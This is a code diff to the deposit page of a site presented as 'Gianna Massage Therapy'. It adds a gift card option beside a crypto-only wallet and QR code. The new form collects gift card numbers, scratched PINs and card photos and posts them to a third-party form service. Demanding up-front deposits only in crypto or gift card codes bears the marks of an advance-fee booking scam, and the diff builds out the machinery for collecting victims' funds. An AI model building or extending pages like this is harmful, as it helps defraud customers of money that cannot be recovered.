@@ -6,7 +6,7 @@
     <title>Pay Deposit | Gianna Massage Therapy</title>
     <meta
       name="description"
-      content="Pay the appointment deposit for Gianna Massage Therapy using BTC, ETH, or USDT TRC-20."
+      content="Pay the appointment deposit for Gianna Massage Therapy using crypto or gift card deposit options."
     />
     <link rel="stylesheet" href="styles.css" />
   </head>
@@ -38,8 +38,8 @@
           <p class="eyebrow">Pay deposit</p>
           <h1>Reserve your appointment with a <span data-deposit-amount>$100</span> deposit.</h1>
           <p>
-            After booking your appointment, choose BTC, ETH, or USDT TRC-20 below. Scan the QR code or copy the wallet address,
-            then keep your transaction hash for your records.
+            After booking your appointment, choose crypto or gift card deposit below. Keep your payment confirmation for your
+            records so Gianna can verify your reservation.
           </p>
           <ul class="deposit-rules">
             <li>60 mins: $100 minimum deposit</li>
@@ -54,44 +54,112 @@
             <span>Minimum deposit due today</span>
             <strong data-deposit-amount>$100</strong>
           </div>
-          <div class="coin-grid" aria-label="Accepted cryptocurrency options">
-            <button class="coin-option is-selected" type="button" data-coin="BTC">
-              <span>BTC</span>
-              <small>Bitcoin</small>
-            </button>
-            <button class="coin-option" type="button" data-coin="ETH">
-              <span>ETH</span>
-              <small>Ethereum</small>
-            </button>
-            <button class="coin-option" type="button" data-coin="USDT">
-              <span>USDT</span>
-              <small>Tether TRC-20</small>
-            </button>
+          <div class="payment-methods" aria-label="Deposit payment methods">
+            <button class="payment-method is-selected" type="button" data-payment-method="crypto">Crypto</button>
+            <button class="payment-method" type="button" data-payment-method="gift-card">Gift Card</button>
           </div>
-          <div class="crypto-checkout is-visible" data-crypto-checkout>
-            <span>Send deposit to this wallet</span>
-            <strong data-crypto-selection>BTC deposit selected</strong>
-            <div class="qr-wrap">
-              <img
-                data-qr-image
-                src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&margin=12&data=bitcoin%3A3Efo29we8TZXGrGRXtoFcyBCHtoHc2gqFQ"
-                alt="BTC wallet QR code"
-              />
-              <small data-qr-caption>Scan to send BTC deposit</small>
+          <div class="payment-section is-visible" data-payment-section="crypto">
+            <div class="coin-grid" aria-label="Accepted cryptocurrency options">
+              <button class="coin-option is-selected" type="button" data-coin="BTC">
+                <span>BTC</span>
+                <small>Bitcoin</small>
+              </button>
+              <button class="coin-option" type="button" data-coin="ETH">
+                <span>ETH</span>
+                <small>Ethereum</small>
+              </button>
+              <button class="coin-option" type="button" data-coin="USDT">
+                <span>USDT</span>
+                <small>Tether TRC-20</small>
+              </button>
             </div>
-            <p>
-              Send at least <span data-deposit-amount>$100</span> worth of the selected coin to the wallet address below.
+            <div class="crypto-checkout is-visible" data-crypto-checkout>
+              <span>Send deposit to this wallet</span>
+              <strong data-crypto-selection>BTC deposit selected</strong>
+              <div class="qr-wrap">
+                <img
+                  data-qr-image
+                  src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&margin=12&data=bitcoin%3A3Efo29we8TZXGrGRXtoFcyBCHtoHc2gqFQ"
+                  alt="BTC wallet QR code"
+                />
+                <small data-qr-caption>Scan to send BTC deposit</small>
+              </div>
+              <p>
+                Send at least <span data-deposit-amount>$100</span> worth of the selected coin to the wallet address below.
+              </p>
+              <code data-wallet-address>3Efo29we8TZXGrGRXtoFcyBCHtoHc2gqFQ</code>
+              <button class="copy-wallet" type="button" data-copy-wallet>Copy Wallet Address</button>
+            </div>
+            <p class="wallet-note" data-network-warning>
+              Send only the selected coin on the shown network. USDT deposits must be sent on TRC-20.
             </p>
-            <code data-wallet-address>3Efo29we8TZXGrGRXtoFcyBCHtoHc2gqFQ</code>
-            <button class="copy-wallet" type="button" data-copy-wallet>Copy Wallet Address</button>
           </div>
-          <p class="wallet-note" data-network-warning>
-            Send only the selected coin on the shown network. USDT deposits must be sent on TRC-20.
-          </p>
+          <div class="payment-section" data-payment-section="gift-card">
+            <div class="gift-card-intro">
+              <span>Gift card deposit</span>
+              <strong>Submit the scratched card details privately.</strong>
+              <p>
+                Purchase an accepted gift card for at least <span data-deposit-amount>$100</span>, scratch the PIN, then
+                enter the card details and upload a clear photo of the card or receipt.
+              </p>
+            </div>
+            <form
+              class="gift-card-form"
+              action="https://usebasin.com/f/cf07d4babd3d"
+              method="post"
+              enctype="multipart/form-data"
+              data-gift-card-form
+              data-gift-card-endpoint="https://usebasin.com/f/cf07d4babd3d"
+            >
+              <label>
+                Name on booking
+                <input name="name" autocomplete="name" required />
+              </label>
+              <label>
+                Phone number
+                <input name="phone" type="tel" autocomplete="tel" required />
+              </label>
+              <label>
+                Gift card type
+                <select name="gift_card_type" required>
+                  <option value="">Choose card type</option>
+                  <option>Apple Gift Card</option>
+                  <option>Steam Gift Card</option>
+                  <option>Amazon Gift Card</option>
+                  <option>Google Play Gift Card</option>
+                  <option>Other Gift Card</option>
+                </select>
+              </label>
+              <label>
+                Card amount
+                <input name="gift_card_amount" type="number" min="100" step="1" placeholder="100" required data-gift-card-amount />
+              </label>
+              <label>
+                Card number
+                <input name="gift_card_number" autocomplete="off" required />
+              </label>
+              <label>
+                Scratched PIN
+                <input name="gift_card_pin" autocomplete="off" required />
+              </label>
+              <label>
+                Card or receipt photo
+                <input name="gift_card_photo" type="file" accept="image/*,.pdf" />
+              </label>
+              <input type="hidden" name="minimum_deposit" value="$100" data-gift-card-deposit />
+              <input type="hidden" name="session" value="" data-gift-card-session />
+              <input type="hidden" name="preferred_time" value="" data-gift-card-time />
+              <button class="button primary" type="submit">Submit Gift Card Deposit</button>
+              <p class="form-status" role="status" data-gift-card-status>
+                Gift card deposits are submitted securely to Gianna's private dashboard.
+              </p>
+            </form>
+          </div>
           <div class="payment-proof-form">
             <h2>After sending deposit</h2>
             <p>
-              Save your transaction hash. Gianna may ask for it when confirming your appointment.
+              Save your transaction hash, gift card receipt, or confirmation details. Gianna may ask for them when confirming
+              your appointment.
             </p>
           </div>
         </div>
